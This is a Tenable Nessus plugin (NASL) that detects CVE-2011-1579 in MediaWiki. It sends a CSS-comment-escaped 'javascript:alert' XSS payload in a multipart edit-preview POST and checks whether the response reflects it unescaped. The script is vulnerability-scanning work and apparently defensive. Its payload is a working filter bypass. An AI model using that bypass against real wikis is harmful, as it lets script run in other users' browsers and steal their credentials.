#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(53448);
  script_version("$Revision: 1.10 $");
  script_cvs_date("$Date: 2016/05/09 15:44:47 $");

  script_cve_id("CVE-2011-1579");
  script_bugtraq_id(47354);
  script_osvdb_id(74620);
  script_xref(name:"Secunia", value:"44142");

  script_name(english:"MediaWiki Backslash Escaped CSS Comments XSS");
  script_summary(english:"Checks for cross-site scripting in CSS comments.");

  script_set_attribute(
    attribute:"synopsis",
    value:
"The remote web server hosts a version of MediaWiki that is affected by
a cross-site vulnerability."
  );
  script_set_attribute(
    attribute:"description",
    value:
"This installation of MediaWiki is affected by a cross-site scripting
vulnerability that allows an attacker to execute arbitrary script code
in the browser of an unsuspecting user. Such script code can steal
authentication credentials and be used to launch other attacks.

This version of MediaWiki may also contain a second cross-site
scripting and/or an unauthorized access vulnerability, but this
plugin did not test for these vulnerabilities."
  );
   # http://lists.wikimedia.org/pipermail/mediawiki-announce/2011-April/000096.html
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?ccfd3229");
  script_set_attribute(
    attribute:"see_also",
    value:"https://bugzilla.wikimedia.org/show_bug.cgi?id=28450"
  );
  script_set_attribute(attribute:"solution", value:"Upgrade to MediaWiki 1.16.3 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:ND/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_cwe_id(20, 74, 79, 442, 629, 711, 712, 722, 725, 750, 751, 800, 801, 809, 811, 864, 900, 928, 931, 990);

  script_set_attribute(attribute:"vuln_publication_date", value:"2011/04/12");
  script_set_attribute(attribute:"patch_publication_date", value:"2011/04/12");
  script_set_attribute(attribute:"plugin_publication_date", value:"2011/04/15");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:mediawiki:mediawiki");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses : XSS");

  script_copyright(english:"This script is Copyright (C) 2011-2016 Tenable Network Security, Inc.");

  script_dependencies("mediawiki_detect.nasl");
  script_require_keys("installed_sw/MediaWiki", "www/PHP");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("http.inc");
include("misc_func.inc");
include("install_func.inc");

app = "MediaWiki";
get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:80, php:TRUE);

install = get_single_install(
  app_name : app,
  port     : port
);
dir = install['path'];

function try_exploit(title)
{
  local_var bound, boundary, eol, headers, pat, post, res, xss, output;

  eol = '\r\n';
  bound = 'NESSUS';
  boundary = '--' + bound;
  xss = '<div style="background-image:ur\\2f\\2a//\\2a\\2fl(javascript:alert(&#39;XSS&#39;))">NESSUS TEST</div>';

  # Format the post data into the format the server needs.
  post = boundary + eol;
  post += 'Content-Disposition: form-data; name="wpTextbox1"' + eol;
  post += eol;
  post += xss + eol;
  post += boundary + "--" + eol;

  headers = make_array(
    "Content-Type", "multipart/form-data; boundary=" + bound
  );

  # Try to preview an edit to the main page w/ some XSS in a CSS attribute.
  res = http_send_recv3(
    item         : dir + "/index.php?title=" + title + "&action=submit",
    add_headers  : headers,
    method       : "POST",
    data         : post,
    port         : port,
    exit_on_fail : TRUE
  );

  # If our XSS isn't somewhere on the page, we've failed. Note that
  # this won't match the contents of the textarea because the
  # less-than signs will be HTML entities in there.
  pat = '<div style="background-image:ur/*//*/l(javascript:alert(&#39;XSS&#39;))">NESSUS TEST</div>';
  if (pat >!< res[2]) return FALSE;

  output = extract_pattern_from_resp(string:res[2], pattern:'ST:' + pat);
  if (empty_or_null(output)) output = strstr(res[2], xss);

  security_report_v4(
    port        : port,
    severity    : SECURITY_WARNING,
    generic     : TRUE,
    xss         : TRUE, # Sets XSS KB item
    line_limit  : 6,
    request     : make_list(http_last_sent_request()),
    output      : chomp(output)
  );

  return TRUE;
}

# Try to exploit the CSS comment injection vulnerability. When initially
# installed, MediaWiki allows the Main Page to be anonymously edited.
if (!try_exploit(title:"Main_Page"))
  audit(AUDIT_WEB_APP_NOT_AFFECTED, app, build_url(port:port, qs:dir));
